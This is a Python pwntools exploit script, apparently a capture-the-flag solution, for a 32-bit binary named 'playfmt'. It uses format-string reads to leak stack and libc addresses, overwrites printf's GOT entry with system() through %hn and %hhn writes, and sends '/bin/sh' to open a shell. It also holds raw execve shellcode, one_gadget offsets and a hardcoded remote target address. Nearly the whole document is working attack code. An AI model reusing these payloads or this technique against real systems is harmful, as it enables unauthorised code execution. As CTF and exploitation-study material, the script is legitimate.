# -*- coding: utf-8 -*-
from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
# context.terminal=['tmux','splitw','-h']
# context(arch='amd64', os='linux')
context(arch='i386', os='linux')
local = 1
elf = ELF('./playfmt')
if local:
    p = process('./playfmt')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)
#more onegadget
#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6
one64 = [0x45226,0x4527a,0xf0364,0xf1207]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6) 
one32 = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]

# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))

# shellcode = asm(shellcraft.sh())
shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'


sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def ms(name,addr):
    print name + "---->" + hex(addr)

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))

# with open('1.txt','wb+') as f:
#     s = ""
#     for i in shellcode:
#         s += "0x" + i.encode("hex")
#     for i in s:
#         f.write(i)

ru("Server")
ru("=====================")
# debug(0x0804853B,0)
sl("aaaa%6$pbbbb%15$p")
ru("aaaa")
stack = int(rc(10),16)
ms("stack--->",stack)
ru("bbbb")
libc_base = int(rc(10),16)-0x18647
ms("libc--->",libc_base)
onegadget = libc_base + one32[1]
system = libc_base + libc.sym["system"]
ms("system--->",system)
printf_got = 0x804A010
stack1 = stack-0xc
stack2 = stack+0x4
ms("stack1--->",stack1)
ms("stack2--->",stack2)

py = ''
py += "%"+str((stack1)&0xff)+"c"+"%6$hhn"
sl(py)

py = ''
py += '%' + str(printf_got&0xffff)+ "c"+ "%10$hn"

sl(py)
# 保证完全写入了，校验
while True:
  sl("King")
  sleep(0.01)
  data = p.recv()
  if data.find("King") != -1:
    break

py = ''
py += "%"+str((stack2)&0xff)+"c"+"%6$hhn"
sl(py)

py = ''
py += '%' + str((printf_got+2)&0xffff)+ "c"+ "%10$hn"
# debug(0x0804853B,0)
sl(py)

py = ''
py += "%"+str((system>>16)&0xff)+"c"+"%11$hhn"
py += "%"+str(((system)&0xffff)-((system>>16)&0xff))+"c"+"%7$hn"
# debug(0x0804853B,0)
sl(py)

sl("/bin/sh")

p.interactive()
